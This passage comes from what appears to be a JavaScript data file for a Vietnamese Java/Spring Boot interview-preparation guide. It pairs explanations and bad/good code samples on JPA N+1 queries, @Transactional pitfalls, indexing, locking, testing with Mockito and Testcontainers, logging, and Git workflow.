Hậu quả: Hết sạch Connection Pool, CPU database vọt lên 100%, server lăn ra chết.

**2 Cách Khắc Phục Chuẩn Kỹ Sư:**
- **Cách 1 (Phổ biến nhất): Dùng \`JOIN FETCH\` trong JPQL:** Bắt Hibernate thực hiện phép \`INNER JOIN\` hoặc \`LEFT JOIN\` ngay trong câu SQL duy nhất.
- **Cách 2: Dùng \`@EntityGraph\`:** Khai báo danh sách các trường liên kết cần nạp kèm mà không cần viết lại JPQL.`,
        badCodeTitle: '❌ Lặp query trong vòng lặp (N+1 Query)',
        badCode: `// Repository mặc định:
List<Department> deps = departmentRepo.findAll(); // 1 Query
for (Department d : deps) {
    // Mỗi lần lặp là 1 Query bắn xuống DB!
    System.out.println(d.getEmployees().size());
}`,
        goodCodeTitle: '✅ Giải quyết triệt để bằng JOIN FETCH',
        goodCode: `public interface DepartmentRepository extends JpaRepository<Department, Long> {
    // 1 câu lệnh SQL duy nhất kéo toàn bộ dữ liệu Department + Employee!
    @Query("SELECT d FROM Department d LEFT JOIN FETCH d.employees")
    List<Department> findAllWithEmployees();
}

// Hoặc dùng EntityGraph:
@EntityGraph(attributePaths = {"employees"})
List<Department> findAll();`,
        interviewTip: 'Lưu ý khi phỏng vấn: "JOIN FETCH có nhược điểm gì không?" ➔ Có! Không nên dùng JOIN FETCH cho nhiều hơn một tập hợp (@OneToMany) cùng lúc vì sẽ sinh ra tích Đề-các (Cartesian Product), làm số bản ghi trả về nhân lên gấp bội, gây tràn bộ nhớ RAM.'
      },
      {
        id: 'transactional-traps',
        title: '2. 3 Cạm Bẫy Chết Người Với @Transactional',
        badge: 'Cạm Bẫy Thường Gặp',
        summary: 'Bỏ quên rollbackFor, dính cạm bẫy Self-Invocation và quên tối ưu readOnly = true cho truy vấn đọc.',
        explanation: `Spring sử dụng cơ chế **AOP Dynamic Proxy** để quản lý transaction. Trước khi vào hàm, Proxy mở connection và bắt đầu transaction; khi hàm chạy xong, Proxy commit; nếu có exception, Proxy rollback.

**3 Cạm bẫy khiến bạn bị fail phỏng vấn hoặc tạo bug trên Production:**
1. **Cạm bẫy 1: Mặc định chỉ rollback với RuntimeException:**
   Nếu phương thức của bạn ném ra một \`Checked Exception\` (ví dụ: \`IOException\`, \`SQLException\`, hoặc class kế thừa trực tiếp từ \`Exception\`), Spring **VẪN SẼ COMMIT** dữ liệu vào database!
   👉 **Khắc phục:** Luôn khai báo: \`@Transactional(rollbackFor = Exception.class)\`.
2. **Cạm bẫy 2: Self-Invocation (Gọi hàm nội bộ):**
   Nếu hàm A (không có @Transactional) gọi hàm B (có @Transactional) trong **CÙNG MỘT CLASS**:
   Lệnh gọi này đi qua con trỏ \`this\` nội bộ chứ không hề đi qua Spring Proxy bọc bên ngoài. Hậu quả: **Transaction của hàm B hoàn toàn không có hiệu lực**!
   👉 **Khắc phục:** Tách hàm B sang một Service riêng biệt.
3. **Cạm bẫy 3: Quên đặt \`readOnly = true\`:**
   Với các hàm chỉ đọc dữ liệu, đặt \`@Transactional(readOnly = true)\` sẽ báo cho Hibernate tắt cơ chế **Dirty Checking** (không cần chụp snapshot của entity để so sánh thay đổi), giúp tiết kiệm lượng lớn CPU và RAM.`,
        badCodeTitle: '❌ Gọi nội bộ tự triệt tiêu Transaction',
        badCode: `@Service
public class OrderService {
    public void process() {
        // Gọi nội bộ qua 'this' ➔ MẤT HOÀN TOÀN @Transactional!
        this.saveOrderWithTx();
    }

    @Transactional // Vô tác dụng khi gọi từ trong cùng class!
    public void saveOrderWithTx() {
        orderRepo.save(new Order());
    }
}`,
        goodCodeTitle: '✅ Tách class và cấu hình rollback chuẩn xác',
        goodCode: `@Service
@RequiredArgsConstructor
public class OrderService {
    private final OrderTxService txService; // Inject service riêng

    public void process() {
        txService.saveOrderWithTx(); // Đi qua Spring Proxy ➔ Hoạt động chuẩn!
    }
}

@Service
public class OrderTxService {
    // Luôn chỉ định rollbackFor và readOnly phù hợp
    @Transactional(rollbackFor = Exception.class)
    public void saveOrderWithTx() {
        // ...
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi về Transaction Isolation Level, hãy nhớ 4 cấp độ: READ UNCOMMITTED (bị Dirty Read), READ COMMITTED (mặc định của PostgreSQL/Oracle, chặn Dirty Read), REPEATABLE READ (mặc định của MySQL InnoDB, chặn Non-repeatable Read), và SERIALIZABLE (chặn Phantom Read, an toàn nhất nhưng chậm nhất).'
      },
      {
        id: 'b-tree-indexing-left-prefix',
        title: '3. Chỉ Mục B+Tree & Quy Tắc Left-Prefix: Cứu Nguy Database Khỏi Full Table Scan',
        badge: 'Tối Ưu DB Triệu Bản Ghi',
        summary: 'Composite Index (A, B, C) chỉ hoạt động khi tuân thủ Left-Prefix. Tránh ORDER BY offset lớn làm nghẽn I/O bằng Keyset Pagination.',
        explanation: `Khi bảng dữ liệu vượt mốc hàng triệu dòng, một câu lệnh SQL không dùng index sẽ khiến Database phải quét từ đầu đến cuối ổ đĩa (Full Table Scan), làm đơ toàn bộ hệ thống!

**1. Bản chất chỉ mục B+Tree:**
- B+Tree sắp xếp dữ liệu theo thứ tự tăng dần ở các Node lá được liên kết dạng danh sách nối đôi (Doubly Linked List).
- Thời gian tìm kiếm: $O(\\log N)$.
- Giúp tăng tốc cực nhanh cho các phép toán: so sánh bằng (\`=\`), so sánh khoảng (\`BETWEEN\`, \`>\`, \`<\`) và sắp xếp (\`ORDER BY\`).

**2. Quy tắc Tiền tố bên trái (Left-Prefix Rule):**
- Giả sử bạn tạo chỉ mục kết hợp: \`CREATE INDEX idx_user ON users (company_id, department_id, created_at);\`.
- ✅ Dùng được Index: \`WHERE company_id = ?\` hoặc \`WHERE company_id = ? AND department_id = ?\`.
- ❌ KHÔNG DÙNG ĐƯỢC INDEX: \`WHERE department_id = ?\` hoặc \`WHERE created_at > ?\` (vì thiếu cột tiền tố bên trái nhất là \`company_id\`).
- ⚠️ Cạm bẫy toán tử khoảng: Nếu bạn viết \`WHERE company_id = ? AND department_id > 5 AND created_at > ?\`, thì chỉ mục chỉ dùng được cho \`company_id\` và \`department_id\`. Cột \`created_at\` đứng sau dấu so sánh khoảng sẽ bị vô hiệu hóa!

**3. Thảm họa OFFSET lớn & Giải pháp Keyset Pagination:**
- Khi viết \`LIMIT 20 OFFSET 1000000\`, Database vẫn phải đọc **1,000,020 bản ghi** từ đĩa, rồi vứt bỏ 1,000,000 dòng đầu chỉ để lấy 20 dòng cuối!
- **Keyset Pagination (Seek Method):** Nhớ ID của bản ghi cuối cùng của trang trước: \`WHERE id < :lastSeenId ORDER BY id DESC LIMIT 20\`. Database nhảy thẳng tới vị trí đó trong $O(1)$!`,
        asciiDiagram: `Composite Index: (company_id, department_id, created_at)
                    ┌─────────────────────────┐
                    │ [Root Node] B+Tree      │
                    └────────────┬────────────┘
            ┌────────────────────┴────────────────────┐
            ▼                                         ▼
┌────────────────────────┐               ┌────────────────────────┐
│ Leaf Node:             │ ────────────> │ Leaf Node:             │
│ comp=1, dep=10, date=..│  Linked List  │ comp=1, dep=20, date=..│
└────────────────────────┘               └────────────────────────┘
 [Left-Prefix Hợp Lệ]: Tìm theo company_id TRƯỚC -> Nhảy trực tiếp vào nhánh lá
 [Vi Phạm Left-Prefix]: Tìm theo department_id bỏ qua company_id -> BẮT BUỘC FULL TABLE SCAN!`,
        badCodeTitle: '❌ Query vi phạm Left-Prefix và phân trang OFFSET cả triệu bản ghi',
        badCode: `-- Giả sử có Composite Index: (shop_id, status, created_at)
-- ❌ VI PHẠM 1: Bỏ qua shop_id, query chỉ dùng status -> B+Tree vô dụng, Full Table Scan!
SELECT * FROM orders WHERE status = 'COMPLETED' ORDER BY created_at DESC;

-- ❌ VI PHẠM 2: Dùng hàm trên cột có index -> Database không dùng được index!
SELECT * FROM orders WHERE DATE(created_at) = '2026-09-17';

-- ❌ VI PHẠM 3: OFFSET sâu làm chết ổ cứng DB:
SELECT * FROM orders WHERE shop_id = 12 ORDER BY id DESC LIMIT 20 OFFSET 500000;`,
        goodCodeTitle: '✅ Query tuân thủ Left-Prefix & Keyset Pagination siêu tốc',
        goodCode: `-- ✅ Tuân thủ đúng thứ tự Left-Prefix (shop_id -> status -> created_at):
SELECT * FROM orders 
WHERE shop_id = 12 AND status = 'COMPLETED' 
ORDER BY created_at DESC LIMIT 20;

-- ✅ So sánh khoảng giá trị trực tiếp không bọc hàm vào cột:
SELECT * FROM orders 
WHERE shop_id = 12 
  AND created_at >= '2026-09-17 00:00:00' 
  AND created_at <  '2026-09-18 00:00:00';

-- ✅ Keyset Pagination: Chạy 5ms dù bảng có 100 triệu bản ghi:
SELECT * FROM orders 
WHERE shop_id = 12 AND id < :lastOrderId 
ORDER BY id DESC LIMIT 20;`,
        interviewTip: 'Người phỏng vấn hỏi: "Tại sao lệnh SELECT count(*) lại chậm trên bảng lớn?". Trả lời: "Với InnoDB, DB phải scan các chỉ mục để đếm do MVCC (đa phiên bản đồng thời), không có con số count lưu sẵn như MyISAM. Cần dùng Redis để cache số lượng hoặc phân tích EXPLAIN xem có dính Full Index Scan không".'
      },
      {
        id: 'optimistic-vs-pessimistic-lock',
        title: '4. Concurrency Control: Optimistic Locking (@Version) vs Pessimistic Locking',
        badge: 'Chống Race Condition',
        summary: 'Xử lý bài toán 10,000 người cùng bấm mua 1 sản phẩm Flash Sale còn đúng 1 lượng tồn kho. Tránh bán lố hàng (Overselling).',
        explanation: `Khi 2 request cùng lúc đọc một bản ghi trong Database:
- Thread A đọc: \`balance = 100\`, trừ 30 ➔ ghi lại 70.
- Thread B đọc: \`balance = 100\`, trừ 50 ➔ ghi lại 50.
- Kết quả: Tài khoản bị trừ 80 nhưng số dư trong DB lại lưu 50! Lỗi này gọi là **Lost Update** (mất cập nhật do Race Condition).

**1. Optimistic Locking (Khóa lạc quan):**
- **Triết lý:** Tin rằng xung đột hiếm khi xảy ra.
- **Cơ chế:** Thêm cột \`version\` kiểu số nguyên vào bảng. Mỗi lần Update, Hibernate sinh câu lệnh:
  \`UPDATE product SET stock = stock - 1, version = version + 1 WHERE id = ? AND version = ?\`.
- Nếu có ai khác đã sửa trước đó, số version trong DB đã nhảy lên ➔ Câu UPDATE ảnh hưởng 0 dòng ➔ Hibernate ném ngay **OptimisticLockException**.
- **Khi nào dùng:** Tỉ lệ đọc nhiều, tỉ lệ ghi trùng lặp thấp. Hiệu năng cao vì không hề khóa dòng trong DB.

**2. Pessimistic Locking (Khóa bi quan):**
- **Triết lý:** Thà khóa trước chứ không để xảy ra sai sót.
- **Cơ chế:** Dùng \`SELECT ... FOR UPDATE\` (\`PESSIMISTIC_WRITE\`). Database sẽ đặt một Exclusive Lock (X-Lock) lên dòng đó. Mọi transaction khác muốn đọc/ghi dòng này đều phải xếp hàng đợi Transaction đầu tiên commit/rollback xong.
- **Khi nào dùng:** Tỉ lệ tranh chấp cực cao (Flash Sale giật deal, chuyển tiền ngân hàng, đặt vé xem phim).`,
        badCodeTitle: '❌ Check-then-act ngây thơ không có cơ chế khóa',
        badCode: `@Transactional
public void buyProduct(Long productId) {
    Product p = productRepo.findById(productId).orElseThrow();
    // ❌ 100 luồng cùng vào đây thấy stock = 1:
    if (p.getStock() > 0) {
        p.setStock(p.getStock() - 1);
        productRepo.save(p); // Cả 100 luồng đều trừ thành công -> Tồn kho âm -99!
    }
}`,
        goodCodeTitle: '✅ Dùng Pessimistic Lock hoặc Atomic Update',
        goodCode: `public interface ProductRepository extends JpaRepository<Product, Long> {
    // ✅ Cách 1: Pessimistic Lock khóa chặt dòng dữ liệu:
    @Lock(LockModeType.PESSIMISTIC_WRITE)
    @Query("SELECT p FROM Product p WHERE p.id = :id")
    Optional<Product> findByIdWithLock(@Param("id") Long id);

    // ✅ Cách 2: Atomic Conditional Update trực tiếp ở mức Database Engine:
    @Modifying
    @Query("UPDATE Product p SET p.stock = p.stock - :qty WHERE p.id = :id AND p.stock >= :qty")
    int deductStockAtomic(@Param("id") Long id, @Param("qty") int qty);
}

// Khi dùng Atomic Update trong Service:
int updatedRows = productRepo.deductStockAtomic(productId, 1);
if (updatedRows == 0) {
    throw new OutOfStockException("Sản phẩm đã hết hàng!");
}`,
        interviewTip: 'Khi phỏng vấn hỏi về Deadlock trong Pessimistic Lock: "Làm sao chống Deadlock khi 2 giao dịch khóa 2 tài nguyên chéo nhau (Tx1: A->B, Tx2: B->A)?". Trả lời ngay: "Áp dụng quy tắc Lock Ordering: Luôn khóa các tài nguyên theo một thứ tự toàn cục nhất quán (ví dụ sắp xếp theo ID tài khoản tăng dần rồi mới lock: Math.min(idA, idB) rồi đến Math.max(idA, idB))".'
      }
    ]
  },
  {
    id: 'testing-qa',
    title: 'Testing & Mockito Thực Chiến',
    icon: '🧪',
    accentColor: '#a78bfa',
    tagline: 'Viết test cho cả nhánh thành công và thất bại để tự tin mở PR mà không sợ vỡ hệ thống',
    topics: [
      {
        id: 'junit-mockito-aaa',
        title: '1. Cấu Trúc Unit Test Chuẩn: Given - When - Then & Mocking',
        badge: 'Phẩm Chất Kỹ Sư',
        summary: 'Sử dụng Mockito để cô lập tầng Service, giả lập hành vi phụ thuộc và kiểm tra tương tác bằng verify().',
        explanation: `Một Unit Test chuyên nghiệp luôn tuân thủ nguyên tắc **FIRST** (Fast, Independent, Repeatable, Self-validating, Timely) và cấu trúc **Given - When - Then** (hoặc AAA: Arrange - Act - Assert):
1. **Given (Arrange):** Chuẩn bị dữ liệu đầu vào và giả lập hành vi của các bên phụ thuộc (\`when(...).thenReturn(...)\`).
2. **When (Act):** Gọi phương thức nghiệp vụ cần kiểm thử.
3. **Then (Assert):** Kiểm chứng kết quả trả về (\`assertEquals\`) và xác minh rằng các phương thức phụ thuộc được gọi đúng số lần (\`verify\`).

**Phân biệt @Mock vs @Spy vs @InjectMocks:**
- \`@Mock\`: Tạo một con bù nhìn giả hoàn toàn rỗng. Nếu không định nghĩa trước thì gọi hàm sẽ trả về \`null\` hoặc \`0\`. Dùng cho các tầng ngoài như Repository, External API.
- \`@Spy\`: Bọc quanh một object **thật**. Code thật vẫn chạy bình thường, trừ những method nào bạn cố tình can thiệp (stub).
- \`@InjectMocks\`: Object mà bạn đang muốn kiểm thử (ví dụ: \`OrderService\`). Mockito sẽ tự động nhét các \`@Mock\` ở trên vào constructor của đối tượng này.`,
        badCodeTitle: '❌ Test chỉ viết cho qua chuyện, không kiểm tra tương tác',
        badCode: `@Test
void testOrder() {
    // Gọi hàm nhưng không assert gì cả, test luôn pass dù code có bug!
    orderService.createOrder(new OrderRequest());
}`,
        goodCodeTitle: '✅ Unit Test chuẩn mực kiểm thử cả trường hợp lỗi',
        goodCode: `@ExtendWith(MockitoExtension.class)
class OrderServiceTest {
    @Mock private OrderRepository orderRepo;
    @Mock private PaymentGateway paymentGateway;
    @InjectMocks private OrderService orderService;

    @Test
    @DisplayName("Ném ngoại lệ và không lưu DB khi tài khoản không đủ số dư")
    void shouldThrowExceptionWhenInsufficientBalance() {
        // 1. Given
        OrderRequest req = new OrderRequest(1L, new BigDecimal("500.00"));
        when(paymentGateway.hasBalance(1L, req.amount())).thenReturn(false);

        // 2. When & 3. Then
        assertThrows(InsufficientFundsException.class, () -> orderService.createOrder(req));
        
        // Cực kỳ quan trọng: Xác minh rằng hàm save() KHÔNG BAO GIỜ được gọi!
        verify(orderRepo, never()).save(any());
    }
}`,
        interviewTip: 'Người phỏng vấn rất thích ứng viên biết dùng `verify(mock, never()).method()`. Nó chứng minh bạn hiểu rõ luồng nghiệp vụ: khi có lỗi xảy ra thì tuyệt đối không được ghi dữ liệu rác vào cơ sở dữ liệu!'
      },
      {
        id: 'mockmvc-integration',
        title: '2. Integration Test Tầng Controller Với MockMvc',
        badge: 'Test Tích Hợp',
        summary: 'Kiểm tra toàn bộ luồng HTTP Status, Request Validation và JSON Response mà không cần bật Tomcat thật.',
        explanation: `Unit test chỉ kiểm tra logic trong Service. Nhưng làm sao bạn biết annotation \`@Valid\` trên Controller có thực sự chặn được request rỗng? Làm sao biết JSON trả về có đúng format không?
Đó là lúc bạn dùng **MockMvc**:
- MockMvc giả lập luồng xử lý HTTP của Spring DispatcherServlet.
- Chạy cực nhanh vì không cần mở cổng mạng (socket) hay khởi động web server Tomcat thật.
- Kiểm tra trực tiếp được: HTTP Status code, Header, Content-Type và từng trường trong JSON bằng **JsonPath** (\`$.id\`, \`$.name\`).`,
        badCodeTitle: '❌ Test Controller bằng cách bật Postman bấm tay',
        badCode: `// Mở Postman, bấm Send bằng tay mỗi lần sửa code.
// Rất mất thời gian, dễ sót case và không thể chạy tự động trên CI/CD!`,
        goodCodeTitle: '✅ Viết test MockMvc tự động chạy trên CI/CD',
        goodCode: `@WebMvcTest(UserController.class)
class UserControllerTest {
    @Autowired private MockMvc mockMvc;
    @MockBean private UserService userService;

    @Test
    @DisplayName("Trả về 400 Bad Request khi email không đúng định dạng")
    void shouldReturn400WhenEmailIsInvalid() throws Exception {
        String invalidPayload = "{\\"name\\": \\"Khuong\\", \\"email\\": \\"not-an-email\\"}";

        mockMvc.perform(post("/api/v1/users")
                .contentType(MediaType.APPLICATION_JSON)
                .content(invalidPayload))
            .andExpect(status().isBadRequest())
            .andExpect(jsonPath("$.errors.email").exists());
    }
}`,
        interviewTip: 'Phân biệt `@SpringBootTest` (bật toàn bộ context của ứng dụng, chậm hơn) và `@WebMvcTest` (chỉ nạp tầng Controller và MockMvc, chạy nhanh gấp 10 lần).'
      },
      {
        id: 'testcontainers-wiremock',
        title: '3. Integration Test Chân Thực: Testcontainers (PostgreSQL/Redis) & WireMock API',
        badge: 'Chuẩn Big Tech 100%',
        summary: 'Bỏ database giả lập H2 vì sai lệch cú pháp SQL thực tế. Dùng Testcontainers chạy Docker thật và WireMock giả lập bên thứ 3.',
        explanation: `Rất nhiều bạn sinh viên làm đồ án dùng **H2 In-Memory Database** để viết test vì nó nhẹ.
Nhưng khi đi làm, **H2 là cạm bẫy nguy hiểm nhất**:
1. H2 không hỗ trợ các tính năng riêng của PostgreSQL/MySQL như kiểu \`JSONB\`, các câu lệnh \`ON CONFLICT DO UPDATE\`, hàm Full-text search hoặc cơ chế Row-level locking (\`FOR UPDATE\`).
2. Test trên H2 pass 100%, nhưng khi deploy lên Production với PostgreSQL thật thì văng Exception sập cả hệ sinh thái!

**Giải pháp thời đại Container: Testcontainers**
- Testcontainers là thư viện Java cho phép JUnit 5 tự động kích hoạt một Container Docker chứa **PostgreSQL, Redis hoặc Kafka thật** chỉ trong vài giây.
- Sau khi chạy test xong, Testcontainers tự động hủy Container và dọn dẹp sạch sẽ ổ cứng.
- Đảm bảo 100% môi trường test y hệt môi trường Production!

**Giả lập Third-Party API bằng WireMock:**
- Không bao giờ gọi API thanh toán thật (VNPay, Stripe, MoMo) trong Unit/Integration Test (tốn tiền và phụ thuộc mạng).
- WireMock dựng một HTTP Server cục bộ giả lập chính xác: HTTP Status (200, 400, 500), JSON Response body, và mô phỏng được cả mạng lag chập chờn (Network Delay) để test Circuit Breaker!`,
        badCodeTitle: '❌ Dùng H2 giả lập và phụ thuộc API ngoài thật',
        badCode: `# application-test.yml: Dùng H2 giả cầy
spring:
  datasource:
    url: jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1 # ❌ Không bắt được lỗi cú pháp PostgreSQL thật!
    driver-class-name: org.h2.Driver`,
        goodCodeTitle: '✅ Testcontainers chạy PostgreSQL thật & WireMock giả lập API',
        goodCode: `@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Testcontainers
class OrderIntegrationTest {
    // ✅ Khởi tạo PostgreSQL thật trong Docker cho toàn bộ test suite:
    @Container
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:16-alpine");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", postgres::getJdbcUrl);
        registry.add("spring.datasource.username", postgres::getUsername);
        registry.add("spring.datasource.password", postgres::getPassword);
    }

    @Test
    void shouldProcessOrderSuccessfullyWithWireMock() {
        // ✅ Dùng WireMock giả lập cổng thanh toán Stripe trả về 200 OK:
        stubFor(post(urlEqualTo("/v1/charges"))
            .willReturn(aResponse()
                .withStatus(200)
                .withHeader("Content-Type", "application/json")
                .withBody("{\\"status\\": \\"succeeded\\", \\"charge_id\\": \\"ch_123\\"}")));

        // Gọi service và kiểm tra kết quả lưu vào Postgres thật:
        OrderResponse res = orderService.checkout(new OrderRequest("ITEM-1", 100L));
        assertEquals("PAID", res.status());
    }
}`,
        interviewTip: 'Nếu phỏng vấn hỏi: "Dự án của em viết Integration Test như thế nào?", hãy tự tin trả lời: "Bọn em dùng Testcontainers để chạy container PostgreSQL và Redis thật nhằm đảm bảo tính tương thích tuyệt đối với Production, kết hợp WireMock để stub các API bên thứ ba như cổng thanh toán để test cả các kịch bản timeout và lỗi 5xx". Phỏng vấn viên Senior sẽ lập tức đánh giá bạn ở level Middle/Senior!'
      }
    ]
  },
  {
    id: 'clean-code-workplace',
    title: 'Clean Code, Logging & Tác Phong Đi Làm',
    icon: '🛡️',
    accentColor: '#2dd4bf',
    tagline: 'Viết code phẳng dễ đọc, ghi log có bối cảnh và phối hợp chuyên nghiệp trong nhóm',
    topics: [
      {
        id: 'guard-clauses',
        title: '1. Quy Tắc Guard Clauses (Bouncer Pattern): Tiêu Diệt Kim Tự Tháp If-Else',
        badge: 'Clean Code Sống Còn',
        summary: 'Kiểm tra điều kiện lỗi và return sớm ngay tại đầu hàm để luồng chính luôn nằm phẳng ở ngoài cùng.',
        explanation: `Khi xem code của một bạn sinh viên hoặc lập trình viên mới đi làm, dấu hiệu nhận biết rõ nhất là **"Kim Tự Tháp Lồng Nhau" (Pyramid of Doom)**:
\`\`\`java
if (input != null) {
    if (user.isActive()) {
        if (hasPermission) {
            // Logic chính nằm thụt vào 4-5 tab thụt đầu dòng!
        }
    }
}
\`\`\`
Người đọc phải căng não giữ trong đầu 4 tầng điều kiện để hiểu dòng code ở giữa.

**Giải pháp: Bouncer Pattern (Người bảo vệ gác cửa)**
Hãy hình dung người bảo vệ trước cửa quán bar: Ai không đủ tuổi hoặc không có vé thì đuổi về ngay tại cửa!
- Đảo ngược điều kiện \`if\`: kiểm tra các trường hợp không hợp lệ trước.
- Thoát ra ngay lập tức bằng \`return\` hoặc \`throw Exception\`.
- Sau khi qua hết các "người gác cửa", luồng xử lý chính (Happy Path) sẽ nằm phẳng phiu ở cấp thụt lề 0.`,
        badCodeTitle: '❌ Thụt lề 4-5 tầng khó đọc',
        badCode: `public OrderResult checkout(Cart cart, User user) {
    if (cart != null && !cart.isEmpty()) {
        if (user != null && user.isActive()) {
            if (paymentGateway.isOnline()) {
                return doCheckout(cart, user);
            } else {
                return OrderResult.error("Gateway offline");
            }
        } else {
            return OrderResult.error("User invalid");
        }
    }
    return OrderResult.error("Cart empty");
}`,
        goodCodeTitle: '✅ Bouncer Pattern: Phẳng phiu, đọc như danh sách việc cần làm',
        goodCode: `public OrderResult checkout(Cart cart, User user) {
    if (cart == null || cart.isEmpty()) {
        return OrderResult.error("CART_EMPTY", "Giỏ hàng không có sản phẩm");
    }
    if (user == null || !user.isActive()) {
        return OrderResult.error("USER_INACTIVE", "Tài khoản không hợp lệ");
    }
    if (!paymentGateway.isOnline()) {
        return OrderResult.error("GATEWAY_OFFLINE", "Cổng thanh toán tạm dừng");
    }

    // Happy Path nằm phẳng hoàn toàn:
    return doCheckout(cart, user);
}`,
        interviewTip: 'Khi được yêu cầu làm bài test Live Coding, việc áp dụng Guard Clauses ngay từ những dòng code đầu tiên sẽ khiến Senior chấm điểm thán phục vì tác phong code cực kỳ già dặn.'
      },
      {
        id: 'structured-logging',
        title: '2. Nghệ Thuật Ghi Log: SLF4J, Correlation ID & Tại Sao CẤM Println?',
        badge: 'Chuẩn Production',
        summary: 'System.out là I/O đồng bộ làm nghẽn luồng. Dùng SLF4J với tham số {} và gắn Correlation ID để trace lỗi.',
        explanation: `**Tại sao cấm hoàn toàn System.out.println trong dự án?**
1. \`System.out\` thực hiện lệnh I/O đồng bộ (Synchronized Block). Dưới tải cao, hàng ngàn luồng sẽ phải xếp hàng chờ đợi nhau chỉ để in ra 1 dòng chữ, làm sập tốc độ xử lý của server!
2. Không có **Log Level** (không thể tắt log debug khi lên Production).
3. Không ghi nhận được **Timestamp, Thread Name, Class Name** và không thể xuất ra định dạng JSON để hệ thống Elasticsearch/Datadog phân tích.

**Quy tắc ghi log chuẩn doanh nghiệp:**
- Dùng \`log.info("Khởi tạo đơn hàng thành công | id={} | amount={}", id, amount);\` (Luôn dùng placeholder \`{}\` để không tốn chi phí nối chuỗi khi log level bị tắt).
- Gắn **Correlation ID (X-Request-ID)** vào MDC (Mapped Diagnostic Context) ở tầng Filter: Mỗi request đi vào hệ thống sẽ có một mã UUID duy nhất đi kèm trên tất cả các dòng log, giúp bạn lọc chính xác toàn bộ lịch sử của 1 người dùng giữa hàng triệu dòng log!`,
        badCodeTitle: '❌ Dùng System.out hoặc nối chuỗi trong log.info',
        badCode: `// ❌ GÂY NGHẼN LUỒNG & TỐN CPU NỐI CHUỖI:
System.out.println("User created: " + user.getId() + " at " + new Date());
log.debug("Process detail: " + complexCalculation()); // Dù debug bị tắt vẫn tốn công tính!`,
        goodCodeTitle: '✅ Dùng SLF4J Parameterized Logging và MDC Correlation ID',
        goodCode: `// ✅ Ghi log bất đồng bộ, placeholder {} không tốn RAM:
log.info("User created successfully | userId={} | email={}", user.getId(), user.getEmail());

// ✅ Bọc MDC trong Filter để trace toàn bộ vòng đời request:
MDC.put("traceId", UUID.randomUUID().toString());
try {
    filterChain.doFilter(request, response);
} finally {
    MDC.clear(); // Bắt buộc clear tránh rò rỉ bộ nhớ luồng Tomcat!
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Tại sao nên dùng placeholder {} thay vì nối chuỗi + trong logger?", trả lời: "Khi nối chuỗi bằng toán tử +, JVM luôn phải tốn CPU và cấp phát chuỗi String mới trên Heap ngay cả khi mức Log Level đó đang bị tắt (ví dụ log.debug() trên Production). Dùng placeholder {}, SLF4J chỉ đánh giá và format chuỗi khi và chỉ khi log level đó thực sự được kích hoạt, tiết kiệm tối đa tài nguyên Heap".'
      },
      {
        id: 'git-hygiene-branching',
        title: '3. Git Hygiene Đi Làm: Atomic Commits, Tránh PR Khổng Lồ & Rebase',
        badge: 'Tác Phong Đồng Đội',
        summary: 'Tách PR dưới 400 dòng code, viết commit theo Conventional Commits và dùng rebase để lịch sử git phẳng phiu.',
        explanation: `Khi làm việc trong môi trường doanh nghiệp, Git không chỉ là công cụ lưu trữ mà là phương tiện giao tiếp chính giữa bạn và đồng nghiệp:
1. **Quy tắc Atomic Commits:** Mỗi commit chỉ giải quyết đúng MỘT thay đổi nhỏ và độc lập. Không gộp vừa thêm tính năng, vừa fix bug, vừa format code vào cùng 1 commit.
2. **Kích thước PR lý tưởng (< 400 dòng):** Một PR 1,000 dòng sẽ bị Senior ngâm 2 tuần vì quá ngán, hoặc review qua loa với chữ "LGTM" và để lọt bug nghiêm trọng. PR 200-300 dòng được review trong 30 phút và merge ngay lập tức!
3. **Quy chuẩn Conventional Commits:**
   - \`feat(order): thêm API tính phí vận chuyển theo khu vực\`
   - \`fix(auth): xử lý NullPointerException khi token rỗng\`
   - \`refactor(user): chuyển sang dùng Constructor Injection\`
   - \`test(payment): bổ sung unit test cho trường hợp thẻ hết hạn\`
4. **Luôn rebase trước khi tạo PR:** Thay vì \`git merge develop\` làm rối tung cây lịch sử commit với hàng chục merge commit rác, hãy dùng \`git checkout feature && git rebase develop\`.`,
        badCodeTitle: '❌ Commit cẩu thả và PR khổng lồ',
        badCode: `// Lịch sử commit:
git commit -m "fix bug"
git commit -m "update"
git commit -m "done task"
// PR gồm 58 files, 2,400 dòng thay đổi gom cả auth, order, payment vào 1 PR!`,
        goodCodeTitle: '✅ Conventional Commits và Atomic PR',
        goodCode: `// Lịch sử commit sạch sẽ:
git commit -m "feat(order): tích hợp tính phí vận chuyển GHN (JIRA-402)"
git commit -m "test(order): viết unit tests cho ShippingFeeCalculator"
// PR chỉ gồm 4 files, 180 dòng thay đổi, có đính kèm ảnh chụp Swagger test`,
        interviewTip: 'Khi phỏng vấn được hỏi: "Em xử lý thế nào khi gặp Merge Conflict?", hãy tự tin trả lời: "Em checkout về nhánh develop để pull code mới nhất, sau đó sang nhánh tính năng gõ git rebase develop. Em giải quyết conflict từng commit một trên IDE, chạy lại test để đảm bảo không gãy logic, rồi mới dùng git push --force-with-lease lên remote".'
      }
    ]
  },
  {
    id: 'workplace-senior-mindset',
    title: 'Bí Quyết Đi Làm & Tư Duy Senior',
    icon: '💼',
    accentColor: '#ec4899',
    tagline: 'Quy tắc ứng xử công sở, nghệ thuật đặt câu hỏi, estimate không sợ trễ hạn, và tư duy làm chủ công việc (Ownership)',
    topics: [
      {
        id: 'the-15-minute-rule',
        title: '1. Nghệ Thuật Đặt Câu Hỏi Chuẩn Kỹ Sư: Quy Tắc 15 Phút & Công Thức 4 Phần',
        badge: 'Kỹ Năng Sinh Tồn Số 1',
        summary: 'Đừng hỏi "Anh ơi code em lỗi", hãy hỏi theo công thức 4 phần sau khi đã tự điều tra 15-30 phút.',
        explanation: `Một trong những lý do lớn nhất khiến Intern/Fresher bị Senior "ngại" hỗ trợ là thói quen: Vừa thấy console báo chữ đỏ là quay sang gọi anh ơi ngay lập tức, trong khi chưa hề đọc xem lỗi nói gì.
Ngược lại, có bạn lại "giấu dốt", ngồi ôm 1 lỗi ngớ ngẩn cả 2 ngày không dám hỏi ai vì sợ bị chê dở, dẫn đến trễ hạn cả sprint!

**Quy tắc 15-30 phút (The 15-Minute Rule):**
